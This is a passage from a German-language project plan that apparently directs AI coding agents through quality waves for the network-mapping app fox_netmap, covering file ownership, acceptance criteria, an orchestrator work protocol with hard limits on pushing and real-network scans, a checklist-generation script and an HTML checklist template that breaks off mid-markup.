| Runde 1: Stile                     | W5-S                              | `app/static/styles.css`, `tests/test_a11y_css.py`                                                                                                                                                                                | F-10 (F-11), F-16 (CSS), F-12 (CSS)                                                                         |
| Runde 1: Seiten                    | W5-H                              | `app/static/index.html`, `app/static/login.html`, `app/static/login.js`                                                                                                                                                          | F-9 (Attribute), F-12 (IDs, Sprachwahl), F-13 (Texte in `index.html`)                                       |
| Runde 1: Fremdbibliothek           | W5-V                              | `app/static/vendor/cytoscape.min.js`, `package.json`, `THIRD_PARTY.md`, `scripts/update_vendor.mjs` (neu), `tests/ui/vendor_version.mjs` (neu)                                                                                   | D-5                                                                                                         |
| Runde 2: Bedienbarkeit und Texte   | W5-R2 (startet nach Gate Runde 1) | `app/static/app.js`, `tests/ui/keyboard.mjs` (neu), `tests/ui/focus_a11y.mjs` (neu), `tests/ui/render_perf.mjs` (neu), `tests/ui/embed_mode.mjs` (neu), `tests/ui/i18n_parity.mjs` (neu), `tests/ui/layout_responsive.mjs` (neu) | F-7, F-8, F-9 (JS), F-12 (JS), F-13 (F-14, Q-11), F-15, F-16 (JS), SF-5 (Anzeige)                           |
| Integration                        | Orchestrator (Integration)        | `app/static/i18n.js`, `tests/ui_dom_check.mjs` (ruft am Ende alle `tests/ui/*.mjs`), `.github/workflows/ci.yml` (Schritt `npm run test:ui`), `CHANGELOG.md`, `STAND.md`                                                          | F-13, Q-11                                                                                                  |

**Abnahmekriterien**

- `node tests/ui_dom_check.mjs` und alle `tests/ui/*.mjs` sind grün, die 184 bisherigen Prüfungen bleiben bestehen.
- `npm run lint` ist grün, `groupOf` ist gelöscht.
- Ein 422 vom Server erzeugt sichtbar `role="alert"` mit Text, die Eingabe bleibt stehen und `patch_422_shows_message` belegt das.
- 1000 Geräte rendern in `render_perf.mjs` unter 1 Sekunde, ein Refresh behält Zoom und Ausschnitt.
- `uv run pytest tests/test_a11y_css.py -q` grün, Kontrast der Log-Stufen mindestens 4,5.

**Nicht-Regression**

- W1 bis W4: API-Verträge unverändert, `/api/settings` liefert weiter getypte Werte und keine Secrets.
- Die Oberfläche nutzt weiter keine fremden Quellen, die CSP bleibt unverändert.

### W6 Testlücken

- **Ziel:** Jede verbliebene Testlücke ist geschlossen, und die Mutationsliste aus Abschnitt 7.6 zeigt keinen echten Überlebenden mehr.
- **Befunde:** T-4; T-16; T-7; T-9; T-11; T-8 (mit T-14, T-15); T-12 (mit T-13)
- **Verschoben oder geteilt:** T-1, T-5 in S-1, T-2, T-3, T-6 und T-10 sind in W2, W3 und W4 mit ihren Fixes erledigt. W6 prüft nur noch, dass die zugehörigen Mutanten sterben.

| Auftrag                        | Unteragent                 | Exklusive Dateien                                                                                                                             | Befunde                                       |
| ------------------------------ | -------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------- |
| Sitzungen und kleine Schwächen | W6-A                       | `tests/conftest.py`, `tests/test_session_expiry.py` (neu), `tests/test_a11y_css.py`, `tests/test_hardening.py`, `tests/test_security_v160.py` | T-4, T-8 (T-14, T-15, Python-Teile)           |
| Echte Netzpfade und Parser     | W6-B                       | `tests/test_network_paths.py` (neu), `tests/test_parsers_property.py` (neu), `tests/fixtures/net/` (neu)                                      | T-9, T-11, T-16 (TCP-Sonde)                   |
| Ende-zu-Ende und Vertrag       | W6-C                       | `tests/test_e2e_scan_api.py` (neu), `tests/test_api_contract.py` (neu), `tests/test_load.py` (neu)                                            | T-7, T-12 (T-13)                              |
| Oberflächen-Tests              | W6-D                       | `tests/ui_dom_check.mjs`, `tests/ui/scan_indicator.mjs` (neu), `tests/ui/hidden_css.mjs` (neu)                                                | T-16 (jsdom-Teile), T-14 (T-8, T-15, JS-Teil) |
| Mutationslauf                  | Orchestrator (Integration) | `scripts/mutants.sh` (neu), `STAND.md`, `docs/produktionsreife/checkliste.html`                                                               | alle Mutanten der Tabelle                     |

**Abnahmekriterien**

- `scripts/mutants.sh` wendet die Mutanten M10, M11, R1, R2, R3, F4, F5, F6, F7, B2, B3 einzeln auf eine Kopie an, jeder lässt mindestens einen Test rot werden.
- `uv run pytest --cov=app --cov-branch` zeigt die Mindestschwelle aus W0, `app/scanner/ports.py` und `app/scanner/snmp.py` jeweils über 80 Prozent.
- `tests/ui_dom_check.mjs` wartet nicht mehr mit festem `setTimeout`.
- `scripts/gate.sh` grün, 10 aufeinanderfolgende Läufe ohne Ausreißer.

**Nicht-Regression**

- Alle Fixes aus W1 bis W5 bleiben, kein Test aus früheren Wellen wird gelöscht oder abgeschwächt.

### W7 Struktur und Typen

- **Ziel:** Die großen Funktionen und Module sind zerlegt, `mypy --strict app` ist grün, ohne dass sich das Verhalten ändert.
- **Befunde:** Q-3; Q-4; Q-14; TL-5; Q-12; Q-16; Q-13
- **Besonderheit:** Vor dem Start legt der Orchestrator `app/types.py` an mit `DeviceRow` und `Device` als TypedDict, damit alle Writer dieselben Typen nutzen. Vor jedem Umbau wird die Ausgabe der betroffenen Funktion als Charakterisierungstest festgehalten.
- **Verschoben oder geteilt:** Q-13 wird nicht umgesetzt, sondern als Entscheidungsvermerk in `docs/` abgelegt. Der Rest von Q-10, die Zerlegung von `app.js`, bleibt ausgelassen.

| Auftrag                  | Unteragent                 | Exklusive Dateien                                                                                                                                                                                                                                                                                                                                                    | Befunde                                         |
| ------------------------ | -------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------- |
| Scanner-Pipeline         | W7-A                       | `app/scanner/run.py`, `app/scanner/pipeline.py` (neu), `tests/test_pipeline.py` (neu)                                                                                                                                                                                                                                                                                | Q-3, TL-5 (`run.py`)                            |
| API und Datenzugriff     | W7-B                       | `app/api.py`, `app/db.py`, `app/routers/` (neu), `app/services/devices.py` (neu), `tests/test_routes_inventory.py` (neu)                                                                                                                                                                                                                                             | Q-4, Q-12, TL-5 (`DeviceRow`, `response_model`) |
| Parser und Regeln        | W7-C                       | `app/scanner/categorize.py`, `app/scanner/tr064.py`, `app/scanner/discover.py`, `app/scanner/mdns.py`, `tests/test_categorize.py`                                                                                                                                                                                                                                    | Q-14, TL-5 (diese Dateien)                      |
| Übrige Module und strict | W7-D                       | `app/config.py`, `app/settings_schema.py`, `app/validation.py`, `app/netutil.py`, `app/auth.py`, `app/security.py`, `app/exporters.py`, `app/healthcheck.py`, `app/logsetup.py`, `app/__main__.py`, `app/dedupe.py`, `app/scanner/names.py`, `app/scanner/notify.py`, `app/scanner/oui.py`, `app/scanner/ports.py`, `app/scanner/snmp.py`, `app/scanner/topology.py` | Q-16, TL-5 (übrige Module, mypy strict)         |
| Integration              | Orchestrator (Integration) | `app/types.py` (neu, vor dem Start), `app/web.py` (Router-Registrierung), `pyproject.toml` (mypy-Overrides je Modul), `docs/` (Entscheidungsvermerk Q-13), `CHANGELOG.md`, `STAND.md`                                                                                                                                                                                | Q-4, Q-13                                       |

**Abnahmekriterien**

- `uv run mypy --strict app` ist grün, `scripts/gate.sh` grün.
- `tests/test_pipeline.py::test_collect_devices_output_unchanged` und `tests/test_categorize.py::test_rule_order_unchanged` laufen unverändert gegen den alten und den neuen Code.
- `tests/test_routes_inventory.py::test_route_table_unchanged` zeigt dieselbe Routentabelle, abzüglich `/api/rooms` falls gelöscht.
- Keine Funktion über Komplexität 15 gemäß `ruff` mit `C90` und `max-complexity = 15`.

**Nicht-Regression**

- Alle Tests aus W1 bis W6 bleiben grün, die Mutationsliste aus W6 bleibt ohne Überlebende.

### W8 Doku

- **Ziel:** Die Dokumentation stimmt mit dem fertigen Stand überein und enthält Betriebs-, Architektur- und Bedrohungsbeschreibung.
- **Befunde:** N-6; D-1; D-3; D-4; D-10
- **Besonderheit:** W8 ist eine reine Doku-Welle, deshalb gehören hier ausnahmsweise die Handbücher den Writern. In den Wellen davor sammelt der Orchestrator nur Notizen in `STAND.md`.
- **Verschoben oder geteilt:** Zu D-2 ist die Datei `.env.example` schon in W1 angelegt, W8 verlinkt nur.

| Auftrag                                                    | Unteragent                 | Exklusive Dateien                                                                                                                                          | Befunde                             |
| ---------------------------------------------------------- | -------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------- |
| README und Beitragsregeln                                  | W8-A                       | `README.md`, `README.en.md`, `CONTRIBUTING.md`, `SECURITY.md`                                                                                              | D-1, D-10 (Release-Checkliste)      |
| Handbuch Deutsch, Englisch                                 | W8-B                       | `docs/02-benutzerhandbuch.md`, `docs/02-benutzerhandbuch.en.md`, `docs/01-anforderungen.md`                                                                | D-4, N-6 (Handbuchstellen)          |
| Handbuch Französisch, Spanisch, Italienisch, Portugiesisch | W8-C                       | `docs/02-benutzerhandbuch.fr.md`, `docs/02-benutzerhandbuch.es.md`, `docs/02-benutzerhandbuch.it.md`, `docs/02-benutzerhandbuch.pt.md`                     | D-4, N-6 (Handbuchstellen)          |
| Sicherheit, Betrieb, Architektur                           | W8-D                       | `docs/03-sicherheit.md`, `docs/04-datenschutz.md`, `docs/05-betrieb.md` (neu), `docs/06-architektur.md` (neu), `scripts/gen_env_table.py` (neu)            | D-10, N-6, D-4 (Referenztabelle)    |
| Integration                                                | Orchestrator (Integration) | `CHANGELOG.md` (`[Unreleased]`), `app/web.py` (`docs_url`, `openapi_url`), `tests/test_docs.py` (neu), `docs/produktionsreife/checkliste.html`, `STAND.md` | D-3, D-10 (Entscheidung `docs_url`) |

**Abnahmekriterien**

- `uv run pytest tests/test_docs.py -q` grün: keine veraltete Version in der README, `[Unreleased]` vorhanden, Referenztabelle deckt alle Einstellungen, Betriebsdokumente existieren.
- Jede Zeile der Tabelle zu N-6 ist korrigiert oder als Restrisiko in Abschnitt 4 von `docs/03-sicherheit.md` aufgenommen.
- Alle sechs Handbücher haben dieselbe Zahl an Überschriften und dieselben `/api/`-Verweise gemäß dem Skript der Gegenprüfung.
- `npx --yes prettier@3 --check` auf allen geänderten Markdown-Dateien ist grün, `scripts/gate.sh` grün.

**Nicht-Regression**

- Alle Gate-Schritte der früheren Wellen bleiben grün, kein Code ändert sich außer der `docs_url`-Entscheidung.

## 9. Arbeitsprotokoll für den ausführenden Agenten

**Dieser Abschnitt ersetzt die Skills und Werkzeuge, die im Repo fehlen.** Er ist vollständig: Wer
ihn befolgt, braucht keine weiteren Vorgaben. Die Regeln stammen aus Kampagnen in über zehn Repos.
Jede Regel steht da, weil ihr Fehlen einmal Arbeit zerstört oder einen Fehler durchgelassen hat.

Begriffe, die unten vorkommen:

- **Welle:** ein Bündel von Aufgaben, das parallel läuft und mit einem gemeinsamen Gate und einem
  Commit endet.
- **Orchestrator:** du, der Hauptagent. Du planst, verteilst, prüfst und committest.
- **Writer:** ein Unteragent, der Dateien ändert. **Scout:** ein Unteragent, der nur liest.
- **Gate:** die vollständige Prüfung nach einer Welle (Abschnitt 9.5).
- **Advisor:** ein frischer, unabhängiger Prüfagent, der den Diff einer Welle gegen ihre
  Abnahmekriterien liest, bevor committet wird (Abschnitt 9.6).

### 9.1 Harte Grenzen

> [!WARNING]
>
> - **Kein Push, kein Merge, kein Tag, kein Release, keine Änderung an Branch-Tracking.** Die
>   Kampagne endet mit Commits auf dem Arbeitsbranch. Der Mensch pusht.
> - **Kein Scan eines echten Netzes.** Nie `python -m app scanner` ohne `NETZ_SUBNETS=127.0.0.0/30`,
>   nie `docker compose up` mit Standard-Subnetzen, kein mDNS, SNMP oder TR-064 gegen echte Geräte.
>   Tests laufen gegen Fakes, Mocks und 127.0.0.1.
> - **Keine Anfragen an Dritte aus dem App-Code heraus** (OUI-Online, Webhooks, Gotify, Ntfy).
>   Tests mocken diese Ziele.
> - **Die Version wird nicht erhöht.** Laut `CONTRIBUTING.md` bumpt der Maintainer die Version.
>   `CHANGELOG.md` bekommt Einträge nur unter `[Unreleased]`.
> - **`git add -A` und `git add .` sind verboten.** Pfade werden einzeln gestaget.

### 9.2 Ablauf je Welle

1. **Plan lesen:** Abschnitt 7 nennt die Aufgaben, Abschnitt 8 die Dateien je Aufgabe. Vor dem
   Start mit `grep -rn` prüfen, ob die Dateiliste noch stimmt. Code kann sich seit dem Review
   bewegt haben; Zeilennummern sind Stand Commit `a63750f`.
2. **Dateibesitz festlegen:** Jede Datei gehört in einer Welle genau einem Writer oder dem
   Orchestrator. Eine einzige geteilte Datei reicht, um eine Welle zu zerstören.
3. **Writer parallel starten:** alle Writer einer Welle in einer einzigen Nachricht mit mehreren
   Agent-Aufrufen. Getrennte Nachrichten laufen nacheinander.
4. **Warten, nicht pollen:** Agenten melden sich selbst. Keine `sleep`-Schleifen. Die Wartezeit
   für Scouts der nächsten Welle nutzen; Lesen kollidiert mit nichts.
5. **Gate** (Abschnitt 9.5), dann **Advisor** (Abschnitt 9.6), dann **Commit** (Abschnitt 9.7),
   dann **Checkliste und Kampagnenstand aktualisieren** (Abschnitte 9.8 und 10).
6. **Nächste Welle** erst nach dem Commit der vorigen.

### 9.3 Dateibesitz und geteilte Ressourcen

| Aufgabe                                                 | Verteilung                                      |
| ------------------------------------------------------- | ----------------------------------------------- |
| Nur lesen (Suche, Aufrufer finden, Logs zusammenfassen) | beliebig parallel                               |
| Writer mit Dateien, die kein anderer Writer anfasst     | parallel                                        |
| Writer, die sich eine Datei teilen                      | Hotspot herauslösen (unten), sonst nacheinander |

- **Hotspot herauslösen:** Ist die einzige Überschneidung eine Integrationsdatei (`app/api.py`-Router-
  Registrierung, `app/web.py`, `__init__.py`, `pyproject.toml`, CI-Workflows, `i18n.js`), gehört sie
  keinem Writer. Die Writer schreiben ihre Module; der Orchestrator trägt die wenigen
  Integrationszeilen beim Gate selbst ein.
- **Bausteine zuerst:** Gemeinsam genutzter Code (Einstellungs-Schema, Netz-Parser, MAC-Normalisierung,
  Logging) wird in einer frühen Welle in ein Modul zusammengeführt. Spätere Wellen benutzen es nur.
  Wer nach Features schneidet, baut in jeder Welle die fehlenden Bausteine neu.
- **Anfrage statt Kopie:** Braucht ein Writer Code aus einer Datei, die ihm nicht gehört, kopiert er
  ihn nicht. Er importiert das vorhandene Symbol oder setzt eine markierte Stelle
  `TODO(shared-module)` und meldet im Bericht, was er braucht, wo es liegt und welche Signatur er
  nutzen würde. Der Orchestrator löst das beim Gate auf. Eine Kopie ist ein Fehler, keine Abkürzung.
- **Geteilte Ressourcen sind auch Besitz:** Die SQLite-Testdatenbank, ein fester Port (8399), der
  Docker-Daemon und der jsdom-Lauf gehören in einer Welle höchstens einem Writer oder dem Gate.
  Writer setzen `NETZ_DATA_DIR` auf ein eigenes Verzeichnis unter `/tmp` und starten Server nur auf
  einem eigenen freien Port an 127.0.0.1.
- **Keine Worktrees durch Agenten.** Tiefe Überschneidung heißt: nacheinander arbeiten oder neu
  schneiden.
- **Briefs gleich groß halten:** Die Welle wartet auf den langsamsten Writer. Ziel sind höchstens
  etwa 25 Minuten je Brief. Größeres wird geteilt.

### 9.4 Brief für jeden Writer

Jeder Brief wiederholt diese Liste. Kein Unteragent kennt den Inhalt dieses Dokuments, außer du gibst
ihn mit.

- **Exklusive Dateien**, ausdrücklich aufgezählt. Nichts außerhalb anfassen. Lint-, Typ- und
  CI-Konfiguration ist schreibgeschützt, außer der Brief handelt genau davon.
- **Nie eine Datei anlegen, stubben oder löschen, die einem anderen gehört.** Fehlt ein Modul eines
  anderen Writers, melden und anhalten.
- **Keine git-Befehle** (add, commit, push, checkout, stash, restore, reset). Git gehört dem
  Orchestrator. Ein `git restore` auf dem geteilten Baum hat schon die Arbeit zweier Agenten gelöscht.
- **Kein repo-weiter Formatierer.** Nur die eigenen Dateien formatieren
  (`uv run ruff format <dateien>`).
- **Verbotene Wirkungen nach außen** aus Abschnitt 9.1 wörtlich in den Brief übernehmen.
- **Fehler außerhalb des Auftrags:** trivial beheben oder ausdrücklich melden. Nie still flicken, nie
  still ignorieren.
- **Erst suchen, dann schreiben:** vor jedem Helfer, Parser oder Formatierer mit `grep` nach einem
  vorhandenen suchen und im Bericht sagen, was gefunden und genutzt wurde.
- **Jeder Fix bekommt einen Regressionstest, der vorher fehlschlägt und nachher besteht.** Der
  Brief nennt den Testnamen. Der Bericht enthält die fehlschlagende Ausgabe vor dem Fix (Test zuerst
  schreiben und laufen lassen, oder gegen eine Kopie der alten Datei; kein `git stash`). Ohne
  Vorher-Lauf gilt der Punkt als **unbestätigt**, nicht als behoben. Ein Test, der auch ohne Fix
  besteht, beweist nichts.
- **Signaturen mitgeben:** Die Funktionen, die der Writer aufrufen oder bauen muss, je eine Zeile
  mit Signatur. Dateiinhalte nicht einfügen, nur Pfad, Symbol und Zeilenbereich.
- **Erst finden, dann lesen:** `grep -n`, dann einen Zeilenbereich. Keine Komplettlesung von
  Dateien über etwa 400 Zeilen (`app/static/app.js`, `app/static/i18n.js`, `tests/ui_dom_check.mjs`,
  `tests/test_scanner.py`).
- **Prüfbefehle für die eigenen Dateien** vor dem Bericht:
  `uv run ruff check <dateien>`, `uv run ruff format --check <dateien>`,
  `uv run mypy <dateien>` (sobald Welle 0 mypy eingeführt hat),
  `uv run pytest -q -p no:cacheprovider <eigene Testdatei>`. Den ganzen Lauf macht das Gate.
- **Integritätsprüfung** für das, was sich nicht ändern darf, mit erwarteter Zahl, zum Beispiel
  `grep -c "require_auth" app/api.py` vorher und nachher gleich oder höher.
- **Bericht höchstens 15 Zeilen:** geänderte Dateien, Prüfbefehle mit Ergebniszeile, Abweichungen
  vom Brief, offene Fragen, Shared-Module-Anfragen. Keine Erzählung.

Modell je Rolle, soweit deine Umgebung Unteragenten und Modellwahl anbietet:

| Rolle                                   | Modell                         |
| --------------------------------------- | ------------------------------ |
| Scout (suchen, zählen, Logs verdichten) | kleines, günstiges Modell      |
| Writer, erster Einsatz                  | Coding-Modell (z. B. Devstral) |
| Writer nach Advisor-Nacharbeit          | Coding-Modell, frischer Agent  |
| Advisor und Verifizierer                | stärkstes verfügbares Modell   |
| Orchestrator                            | stärkstes verfügbares Modell   |

- **Jeder Unteragent bekommt sein Modell ausdrücklich**, wenn die Umgebung das erlaubt. Ohne Angabe
  erbt er meist das teure Sitzungsmodell.
- **Kein Writer auf dem kleinsten Modell.** Kleine Modelle schwächen unter dem Druck "Linter muss
  grün sein" die Konfiguration ab und melden Erfolg.
- **Ein Brief, der für das Coding-Modell zu schwer wirkt, wird geteilt**, nicht an ein größeres
  Modell gegeben.
- Ohne Unteragenten in der Umgebung arbeitet der Orchestrator die Briefs nacheinander selbst ab.
  Gate, Advisor-Ersatz (Abschnitt 9.6) und Commit-Regeln gelten unverändert.

### 9.5 Gate nach der Welle, nie währenddessen

Erst wenn **alle** Writer einer Welle zurück sind, in dieser Reihenfolge:

1. **`ls` jeder Datei, die die Welle erzeugen sollte**, bevor ein Bericht gelesen wird. Eine
   verschwundene Datei steht in keinem Bericht.
2. **Integrationsdateien** selbst eintragen und **jede Shared-Module-Anfrage auflösen**: Code in das
   eine gemeinsame Modul ziehen, alle Aufrufer umstellen, jedes `TODO(shared-module)` entfernen.
3. **Volles Gate**, ein Befehl:

   ```bash
   uv run ruff check . \
     && uv run ruff format --check . \
     && uv run mypy \
     && uv run pytest -q -p no:cacheprovider \
     && npm ci --no-audit --no-fund && node tests/ui_dom_check.mjs \
     && npx --no-install eslint app/static tests/ui_dom_check.mjs
   ```

   Bis Welle 0 durch ist, gelten nur die Teile, die schon existieren (Abschnitt 6, Basislinie).
   Ab Welle 0 steht derselbe Befehl als `scripts/gate.sh` im Repo.

4. **Container-Prüfung** nur in Wellen, die `Dockerfile`, `docker/entrypoint.sh`,
   `docker-compose.yml` oder Abhängigkeiten ändern: die Schritte des CI-Jobs `docker` aus
   `.github/workflows/ci.yml` lokal nachfahren, mit `NETZ_SUBNETS=127.0.0.0/30`.
5. **Rot ist rot.** Ein Gate mit Harness-Fehlern (Optionsfehler, Tracebacks im Runner) ist kein
   Ergebnis. Erst das Werkzeug reparieren, dann neu prüfen. Ein Fehler in einer Datei, die kein Writer
   angefasst hat, ist bis zum Beweis des Gegenteils ein Wettlauf um eine geteilte Ressource: Daten
   löschen, einmal neu laufen lassen, dann urteilen.

### 9.6 Advisor vor jedem Commit, der Verhalten ändert

- **Wer:** ein frischer Unteragent auf dem stärksten verfügbaren Modell, ohne den Verlauf der Welle.
  Nie der Orchestrator selbst, nie ein Writer der Welle.
- **Was er bekommt:** den Diff der Welle (`git diff`), die Abnahmekriterien der Welle aus Abschnitt 7,
  die Nicht-Regressions-Kriterien aller früheren Wellen und den Gate-Befehl.
- **Was er tut:** liest den Diff gegen die Kriterien, lässt das Gate selbst laufen, prüft jeden
  Regressionstest durch Rückbau des Fixes in einer Kopie, und versucht die schärfste Behauptung der
  Writer zu widerlegen. Er antwortet mit **APPROVED** oder einer konkreten Nacharbeitsliste
  (Datei:Zeile, was falsch ist, woran man es sieht).
- **Du prüfst seine Punkte**, bevor du handelst. Advisors irren auch. Ein abgelehnter Punkt bekommt
  eine schriftliche Begründung im Kampagnenstand.
- **Nacharbeit:** bis etwa zehn Zeilen ohne neue Testdatei machst du selbst, mit Test vorher und
  nachher. Größeres geht an einen **frischen** Writer, gleiche Dateien, die
  geprüften Punkte und die ursprünglichen Kriterien. Danach liest der Advisor den Nacharbeits-Diff.
  Eine zweite Nacharbeitsliste für dieselbe Welle erledigst du selbst.
- **Ausnahmen:** reine Doku-, reine Test- und rein mechanische Wellen (Formatierer) dürfen ohne
  Advisor committen. Das steht dann im Wellenbericht.
- **Ohne stärkeres Modell:** den Diff kalt neu lesen, als wäre er fremd, jeden Regressionstest
  zurückbauen, und im Bericht sagen, dass keine unabhängige Prüfung möglich war.

### 9.7 Commit, nur durch den Orchestrator

- `git diff` der berührten Dateien selbst lesen, nicht die Zusammenfassung der Writer.
- Gate selbst laufen lassen, die schärfste Behauptung der Welle direkt nachprüfen (den Endpunkt mit
  `curl` gegen 127.0.0.1 aufrufen, die zitierte Zeile greppen, den einen Test laufen lassen).
- `git status` und `git log -1` direkt vor **jedem** Commit.
- Ein Commit je Welle, Pfade einzeln gestaget, Nachricht im Stil des Repos: Conventional Commits,
  deutsch, Umlaute im Betreff als `ae oe ue ss` wie in der bestehenden Historie, zum Beispiel
  `fix(security): Embed-Token-Scope auch fuer GET /api/device/{mac} (W2-S1)`.
- Branch: `vibe/produktionsreife` vom Commit `a63750f` oder dem aktuellen `main`, falls der Mensch
  das so vorgibt. Branch-Präfix `vibe/` ist Konvention des Repos (`CONTRIBUTING.md`).

### 9.8 Kampagnenstand auf Platte, nach jeder Welle

Die Kampagne überlebt den Kontext des Orchestrators nur, wenn ihr Stand auf Platte steht.

- **`docs/produktionsreife/STAND.md`**, höchstens eine Bildschirmseite: nächste Welle, offene
  Fragen, getroffene Entscheidungen mit Begründung, Fortsetzungsschritte. Ein frischer Kontext muss
  daraus weiterarbeiten können, ohne das Protokoll der Sitzung zu lesen.
- **`docs/produktionsreife/ARCHIV.md`**: abgeschlossene Wellen mit Details. In `STAND.md` bleibt je
  Welle eine Zeile mit Ergebnis und Commit.
- **`docs/produktionsreife/checkliste.html`**: die Checkliste nach Abschnitt 10, nach jeder Welle
  aktualisiert und im Wellen-Commit enthalten.
- Vor jedem Update die Befund-ID über alle drei Dateien greppen. Ein Status an zwei Stellen veraltet
  an der Stelle, an die man nicht gedacht hat.
- Nach dem Commit einer Welle und dem Update der Dateien ist ein guter Moment, den eigenen Kontext
  zu verdichten (Kontext komprimieren oder neue Sitzung), danach `STAND.md` neu lesen.

### 9.9 Fehlerfälle

- **Agent abgebrochen oder blockiert:** erst `git status`, um zu sehen, was er wirklich geändert hat.
  Dann denselben Agenten mit einer Zusammenfassung fortsetzen, nicht ersetzen.
- **HEAD hat sich unerwartet bewegt** (Commits tauchen auf oder verschwinden): anhalten, den Menschen
  fragen. Nicht rebasen, nicht raten.
- **Selbstberichte sind keine Prüfung.** "Tests grün" aus einem Writer-Bericht zählt erst, wenn das
  Gate es bestätigt hat.

## 10. HTML-Checkliste

**Kai verfolgt den Fortschritt in `docs/produktionsreife/checkliste.html`.** Der Agent legt die Datei in
Welle 0 aus der Vorlage unten an, trägt alle Punkte aus Abschnitt 7 ein und aktualisiert sie in jedem
Wellen-Commit. Die Datei braucht kein Netz und keinen Server: Doppelklick, sie öffnet im Browser.

Regeln für den Agenten:

- **Eine Zeile je Befund aus Abschnitt 7**, plus je eine Zeile für jedes Abnahmekriterium aus
  Abschnitt 6 (`ZK-1` bis `ZK-13`, Welle `W8`, Schwere `hoch`). Keine ID fehlt, keine wird erfunden.
  Die Befundzeilen erzeugt das Skript unten, nicht die Hand. Neue Funde während der
  Arbeit bekommen IDs `N-1`, `N-2` und stehen in `STAND.md` mit Begründung.
- **Daten nur im `<script id="daten">`-Block ändern.** Darstellung und Logik bleiben unverändert.
- **Status-Werte:** `offen`, `in_arbeit`, `review` (Advisor läuft), `erledigt`, `verworfen`,
  `blockiert`. `erledigt` nur mit Commit-Hash und Nachweis: Name des Regressionstests oder Befehl
  mit Ergebnis. `verworfen` nur mit Begründung im Feld `notiz`.
- **`stand`** im Datenblock ist Datum und Commit der letzten Aktualisierung.
- **Nach dem Ändern prüfen:** `node -e` mit dem JSON aus dem Block parsen (Syntaxfehler machen die
  Seite leer) und zählen, dass die Zahl der Einträge der Zahl der IDs in Abschnitt 7 plus Abschnitt 6
  entspricht.

Startdaten erzeugen (liest Abschnitt 7 dieses Dokuments, erwartet 101 Punkte):

```python
# scripts/checkliste_punkte.py, Aufruf: uv run python scripts/checkliste_punkte.py docs/produktionsreife/UEBERGABE.md
import json, re, sys

text = open(sys.argv[1], encoding="utf-8").read()
sec = text.split("## 7. Befundkatalog", 1)[1].split("\n## 8.", 1)[0]
items = []
for block in re.split(r"\n#### ", sec)[1:]:
    head, _, body = block.partition("\n")
    m = re.match(r"(.*) \(([^()]*)\)\s*$", head.strip())
    meta = re.search(r"\*\*Schwere:\*\* (\w+).*\*\*Welle:\*\* (W\d)", body)
    if not m or not meta:
        continue
    ids = [i.strip() for i in m.group(2).split(",")]
    items.append(
        {
            "id": ids[0],
            "titel": m.group(1).replace("`", ""),
            "welle": meta.group(2),
            "schwere": meta.group(1),
            "status": "offen",
            "nachweis": "",
            "commit": "",
            "notiz": ("mit " + ", ".join(ids[1:])) if len(ids) > 1 else "",
        }
    )
print(json.dumps(items, ensure_ascii=False, indent=1))
print(len(items), "Punkte", file=sys.stderr)
```

Die Ausgabe kommt als Feld `punkte` in den Datenblock, die 13 Zeilen `ZK-1` bis `ZK-13` dazu. Die
Wellenliste im Datenblock nennt `W0` bis `W8` mit den Titeln aus Abschnitt 8.

Vorlage (vollständig, so übernehmen):

```html
<!doctype html>
<html lang="de">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>fox_netmap · Produktionsreife · Checkliste</title>
    <style>
      :root {
        --bg: #fff;
        --fg: #1b1f24;
        --mut: #5b6470;
        --line: #d8dde3;
        --card: #f6f8fa;
        --ok: #1a7f37;
        --run: #9a6700;
        --rev: #8250df;
        --open: #57606a;
        --bad: #cf222e;
        --drop: #6e7781;
      }
      @media (prefers-color-scheme: dark) {
        :root {
          --bg: #0d1117;
          --fg: #e6edf3;
          --mut: #9da7b3;
          --line: #30363d;
          --card: #161b22;
          --ok: #3fb950;
          --run: #d29922;
          --rev: #a371f7;
          --open: #8b949e;
          --bad: #f85149;
          --drop: #6e7681;
        }
      }
      * {
        box-sizing: border-box;
      }
      body {
        margin: 0;
        padding: 16px;
        background: var(--bg);
        color: var(--fg);
        font:
          15px/1.45 system-ui,
          -apple-system,
          "Segoe UI",
          sans-serif;
        max-width: 1200px;
        margin-inline: auto;
      }
      h1 {
        font-size: 1.4rem;
        margin: 0.2rem 0;
      }
      .meta {
        color: var(--mut);
        margin: 0 0 1rem;
      }
      .bars {
        display: grid;
        gap: 6px;
        margin: 1rem 0;
      }
      .bar {
        display: grid;
        grid-template-columns: 9rem 1fr 4.5rem;
        gap: 8px;
        align-items: center;
      }
      .track {
        height: 10px;
        background: var(--card);
        border: 1px solid var(--line);
        border-radius: 6px;
        overflow: hidden;
      }
      .fill {
        height: 100%;
        background: var(--ok);
      }
      .filters {
        display: flex;
        flex-wrap: wrap;
        gap: 8px;
        margin: 1rem 0;
      }
      select,
      input {
        background: var(--card);
        color: var(--fg);
        border: 1px solid var(--line);
        border-radius: 6px;
        padding: 4px 8px;
        font: inherit;
      }
      .table-wrap {
        overflow-x: auto;
      }
      table {
        border-collapse: collapse;
        width: 100%;
      }
      th,
      td {
        border-bottom: 1px solid var(--line);
        padding: 6px 8px;
        text-align: left;
        vertical-align: top;
      }
      th {
        position: sticky;
        top: 0;
        background: var(--bg);
      }
      .tag {
        display: inline-block;
        padding: 1px 8px;
        border-radius: 10px;
        font-size: 0.8rem;
        border: 1px solid currentColor;
        white-space: nowrap;
      }
      .s-erledigt {
        color: var(--ok);
      }
      .s-in_arbeit {
        color: var(--run);
      }
      .s-review {
        color: var(--rev);
      }
      .s-offen {
        color: var(--open);
      }
      .s-blockiert {
        color: var(--bad);
      }
      .s-verworfen {
        color: var(--drop);
      }
      .sev-kritisch,
      .sev-hoch {
        font-weight: 600;
      }
      code {
        font-size: 0.85em;
      }
      .mut {
        color: var(--mut);
      }
      @media print {
        th {
          position: static;
        }
        .filters {
          display: none;
        }
      }
    </style>
  </head>
  <body>
    <p class="mut">Checkliste · fox_netmap</p>
    <h1>Weg zur Produktionsreife</h1>
    <p class="meta" id="meta"></p>
    <div class="bars" id="bars" aria-label="Fortschritt je Welle"></div>
    <div class="filters">
      <label
        >Welle
        <select id="f-welle">
          <option value="">alle</option>
        </select></label
      >
      <label
        >Status
        <select id="f-status">
          <option value="">alle</option>
        </select></label
      >
      <label
        >Schwere
        <select id="f-schwere">
